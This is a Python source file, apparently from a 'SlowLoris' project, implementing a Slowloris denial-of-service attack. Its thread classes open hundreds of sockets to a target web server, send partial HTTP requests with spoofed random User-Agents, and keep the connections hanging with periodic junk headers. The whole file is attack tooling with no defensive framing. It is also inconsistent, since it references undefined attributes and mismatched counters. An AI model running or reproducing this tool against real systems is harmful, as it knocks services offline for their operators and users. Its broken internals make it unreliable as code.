#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
MIT License

Copyright (c) 2017 Maxim Krivich

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import random
import socket
import threading
import time

from fake_useragent import UserAgent, FakeUserAgentError

from SlowLoris import logger


class SocketProducer(threading.Thread):
    def __init__(self, queue):
        super(SocketProducer, self).__init__()
        self.queue = queue

    def run(self):
        while True:
            if self.__alive_socket_cnt <= self.soc_cnt:  # add here tqdm
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((self.target['url'], self.target['port']))
                    sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
                    for k in self.headers.keys():
                        if k == "User-Agent":
                            self.headers[k] = str(self.fake_ua.random)
                        sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                    self.queue.put(sock)
                except socket.error as err:
                    logger.error(err)


class RequestSender(threading.Thread):
    def __init__(self, queue):
        super(RequestSender, self).__init__()
        self.queue = queue

    def run(self):
        while True:
            soc = self.queue.get()
            try:
                soc.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
                self.__sended_request_cnt += 1
            except socket.error:
                self.__sockets.remove(soc)
                self.__died_sockets_cnt += 1
                self.__alive_socket_cnt -= 1
            except Exception as e:
                logger.exception(e)
            finally:
                self.queue.task_done()


class Connection(threading.Thread):
    SLEEP_TIME = 0.01

    def __init__(self, target, socket_count=300, headers={
        'User-Agent': None,  # UserAgent()
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ru,en-us;q=0.7,en;q=0.3',
        'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
        'Connection': 'keep-alive'
    }):
        super(Connection, self).__init__()
        # self.lock = lock
        self.target = target
        self.headers = headers

        try:
            self.fake_ua = UserAgent()
        except FakeUserAgentError as fe:
            logger.error(fe)
        # Counters
        self.socket_count = socket_count
        self.__cnt_sent_requests = 0
        self.__cnt_died_sockets = 0
        self.__cnt_alive_socket = 0
        self.__sockets = []

    def __create_sockets(self):
        while self.__cnt_alive_socket <= self.socket_count:  # add here tqdm
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.target['url'], self.target['port']))
                sock.send("GET /? {} HTTP/1.1\r\n".format(random.randint(0, 9999999)))
                for k in self.headers.keys():
                    if k == "User-Agent":
                        self.headers[k] = str(self.fake_ua.random)
                    sock.send("{key}:{value}\r\n".format(key=k, value=self.headers[k]))
                self.lock.acquire()
                self.__sockets[0] += sock
                self.lock.release()
            except socket.error as err:
                logger.error(err)

    def get_counter(self):
        return self.__cnt_sent_requests

    def run(self):
        while self.is_alive:
            try:
                self.socket.send("X-a: {} \r\n".format(random.randint(0, 9999999)))
                self.__cnt_sent_requests += 1
                time.sleep(self.SLEEP_TIME * random.random())
            except socket.error as err:
                logger.error(err)
            finally:
                self.socket.close()
